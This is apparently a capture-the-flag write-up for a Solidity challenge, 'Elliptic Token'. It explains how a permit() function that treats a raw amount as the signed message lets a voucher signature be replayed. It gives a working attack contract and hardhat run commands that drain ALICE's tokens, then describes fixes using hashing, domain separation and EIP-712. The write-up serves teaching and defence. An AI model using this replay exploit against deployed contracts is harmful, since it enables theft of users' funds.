# Level 35: Elliptic Token

## Challenge Description

> BOB created and owns a new ERC20 token with an elliptic curve–based signed voucher redemption system called EllipticToken ($ETK). Bob can create vouchers off-chain that can be redeemed on-chain for $ETK. The contract also includes a permit system based on elliptic curve signatures.
>
> Bob is a lazy developer and "optimized" some steps of the ECDSA algorithm. Can you find the flaw?
>
> Your goal is to steal the $ETK tokens that ALICE (0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e) just redeemed.
>
> Things that might help:
> - Look for any missing step in the Elliptic Curve Digital Signature Algorithm (ECDSA).
> - Good luck. Elliptic curves do not forgive domain confusion.

## Contract Location

- **Instance Contract**: `contracts/level-35-elliptic-token/EllipticToken.sol`
- **Solution Contract**: `contracts/level-35-elliptic-token/EllipticTokenAttack.sol`

## Understanding the Challenge

The EllipticToken contract has two signature-based functions:

### 1. redeemVoucher()
```solidity
function redeemVoucher(
    uint256 amount,
    address receiver,
    bytes32 salt,
    bytes memory ownerSignature,
    bytes memory receiverSignature
) external {
    bytes32 voucherHash = keccak256(abi.encodePacked(amount, receiver, salt));
    require(!usedHashes[voucherHash], HashAlreadyUsed());

    // Verify owner (BOB) signed the voucher
    require(ECDSA.recover(voucherHash, ownerSignature) == owner(), InvalidOwner());

    // Verify receiver (ALICE) accepted the voucher
    require(ECDSA.recover(voucherHash, receiverSignature) == receiver, InvalidReceiver());

    usedHashes[voucherHash] = true;
    _mint(receiver, amount);
}
```

This function:
- Creates `voucherHash = keccak256(amount, receiver, salt)`
- Verifies BOB (owner) signed the hash
- Verifies the receiver (ALICE) signed the hash
- Mints tokens to the receiver

### 2. permit()
```solidity
function permit(
    uint256 amount,
    address spender,
    bytes memory tokenOwnerSignature,
    bytes memory spenderSignature
) external {
    bytes32 permitHash = keccak256(abi.encode(amount));
    require(!usedHashes[permitHash], HashAlreadyUsed());
    require(!usedHashes[bytes32(amount)], HashAlreadyUsed());

    // Recover token owner - THIS IS THE BUG!
    address tokenOwner = ECDSA.recover(bytes32(amount), tokenOwnerSignature);

    // Verify spender accepted
    bytes32 permitAcceptHash = keccak256(abi.encodePacked(tokenOwner, spender, amount));
    require(ECDSA.recover(permitAcceptHash, spenderSignature) == spender, InvalidSpender());

    usedHashes[permitHash] = true;
    _approve(tokenOwner, spender, amount);
}
```

This function:
- Uses `bytes32(amount)` **directly** as the ECDSA message (NOT A HASH!)
- Recovers the token owner from this "message"
- Approves the spender to spend tokens

## Vulnerability Analysis

### The Missing Step: Domain Separation

In proper ECDSA implementations, the message should be:
1. **Hashed** using a cryptographic hash function
2. **Domain-separated** to prevent cross-context signature reuse

The `permit()` function violates both principles:

```solidity
// VULNERABLE: Uses raw bytes32(amount) as the "message"
address tokenOwner = ECDSA.recover(bytes32(amount), tokenOwnerSignature);
```

### Domain Confusion Attack

Since `amount` is controlled by the caller, we can set:
```
amount = uint256(voucherHash)
```

This means:
```
bytes32(amount) = bytes32(uint256(voucherHash)) = voucherHash
```

**ALICE's signature from `redeemVoucher` (which signed `voucherHash`) will now verify in `permit`!**

| Function | Message Signed | Who Signs |
|----------|---------------|-----------|
| redeemVoucher | `voucherHash = keccak256(amount, ALICE, salt)` | ALICE |
| permit | `bytes32(amount)` where `amount = uint256(voucherHash)` | ALICE (reused!) |

## Exploit Strategy

```
1. ALICE redeems voucher:
   - Signs: voucherHash = keccak256(100 ETK, ALICE, salt)
   - Gets: 100 ETK tokens

2. Attacker observes the transaction and extracts:
   - voucherAmount = 100 ETK
   - salt
   - ALICE's receiverSignature

3. Attacker computes:
   - voucherHash = keccak256(voucherAmount, ALICE, salt)
   - fakeAmount = uint256(voucherHash)  // HUGE number!

4. Attacker signs permitAcceptHash:
   - permitAcceptHash = keccak256(ALICE, attacker, fakeAmount)
   - attackerSignature = sign(permitAcceptHash)

5. Attacker calls permit():
   - permit(fakeAmount, attacker, aliceVoucherSignature, attackerSignature)
   - ECDSA.recover(bytes32(fakeAmount), aliceSignature) returns ALICE!
   - Attacker gets approved for fakeAmount tokens (huge!)

6. Attacker steals tokens:
   - transferFrom(ALICE, attacker, aliceBalance)
```

## Why This Works

```
                    redeemVoucher                    permit
                    ─────────────                    ──────
Message to sign:    voucherHash                      bytes32(amount)
                         │                                │
                         └──────── SAME VALUE! ───────────┘
                                      │
                    If amount = uint256(voucherHash):
                    bytes32(amount) == voucherHash
                                      │
                    ALICE's voucher signature verifies
                    as a permit signature!
```

## Solution Contract

```solidity
contract EllipticTokenAttack {
    function attack(
        uint256 voucherAmount,
        bytes32 salt,
        bytes memory aliceVoucherSignature,
        bytes memory attackerPermitSignature
    ) external {
        // Compute the voucherHash ALICE signed
        bytes32 voucherHash = keccak256(abi.encodePacked(voucherAmount, ALICE, salt));

        // Set amount = uint256(voucherHash) for domain confusion
        uint256 fakeAmount = uint256(voucherHash);

        // Call permit - ALICE's signature verifies!
        token.permit(fakeAmount, attacker, aliceVoucherSignature, attackerPermitSignature);

        // Steal all tokens
        uint256 aliceBalance = token.balanceOf(ALICE);
        token.transferFrom(ALICE, attacker, aliceBalance);
    }
}
```

## Running the Exploit

### 1. Deploy Instance Contract (Local Testing)
```bash
npx hardhat deploy --tags EllipticToken --network localhost
```

### 2. Deploy Solution Contract
```bash
npx hardhat deploy --tags EllipticTokenAttack --network localhost
```

Or with a specific token address:
```bash
ELLIPTIC_TOKEN_ADDRESS=0x... npx hardhat deploy --tags EllipticTokenAttack --network sepolia
```

### 3. Execute Attack
```bash
npx hardhat run scripts/level-35-elliptic-token/attack.ts --network localhost
```

For the real challenge, provide voucher info:
```bash
ELLIPTIC_TOKEN_ADDRESS=0x... \
VOUCHER_AMOUNT=100000000000000000000 \
VOUCHER_SALT=0x... \
ALICE_SIGNATURE=0x... \
npx hardhat run scripts/level-35-elliptic-token/attack.ts --network sepolia
```

## Key Takeaways

### 1. Always Hash Before Signing
ECDSA signatures should always be over a **hash** of the message, not raw data:
```solidity
// WRONG: Raw value as message
ECDSA.recover(bytes32(amount), signature);

// CORRECT: Hash the message
bytes32 messageHash = keccak256(abi.encodePacked(amount, ...));
ECDSA.recover(messageHash, signature);
```

### 2. Domain Separation is Critical
Different functions should use different "domains" to prevent signature reuse:
```solidity
// Add a domain separator unique to each function
bytes32 voucherHash = keccak256(abi.encodePacked(
    "VOUCHER:",
    amount, receiver, salt
));

bytes32 permitHash = keccak256(abi.encodePacked(
    "PERMIT:",
    tokenOwner, spender, amount
));
```

### 3. Use EIP-712 for Structured Signatures
EIP-712 provides a standard for domain separation:
```solidity
bytes32 constant PERMIT_TYPEHASH = keccak256(
    "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
);

bytes32 digest = keccak256(abi.encodePacked(
    "\x19\x01",
    DOMAIN_SEPARATOR,
    keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonce, deadline))
));
```

## Prevention

### Fix 1: Proper Hashing in permit()
```solidity
function permit(
    uint256 amount,
    address tokenOwner,  // Explicit parameter, not recovered
    address spender,
    bytes memory tokenOwnerSignature,
    bytes memory spenderSignature
) external {
    // Hash the message properly with domain separation
    bytes32 permitHash = keccak256(abi.encodePacked(
        "EllipticToken:Permit",
        tokenOwner,
        spender,
        amount,
        block.chainid,
        address(this)
    ));
    
    require(!usedHashes[permitHash], HashAlreadyUsed());
    require(ECDSA.recover(permitHash, tokenOwnerSignature) == tokenOwner, InvalidOwner());
    // ... rest of the function
}
```

### Fix 2: Use OpenZeppelin's ERC20Permit
```solidity
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";

contract EllipticToken is ERC20, ERC20Permit {
    constructor() ERC20("EllipticToken", "ETK") ERC20Permit("EllipticToken") {}
}
```

## References

- [ECDSA Wikipedia](https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm)
- [EIP-712: Typed Structured Data Hashing](https://eips.ethereum.org/EIPS/eip-712)
- [EIP-2612: Permit Extension for ERC-20](https://eips.ethereum.org/EIPS/eip-2612)
- [OpenZeppelin ECDSA](https://docs.openzeppelin.com/contracts/4.x/api/utils#ECDSA)
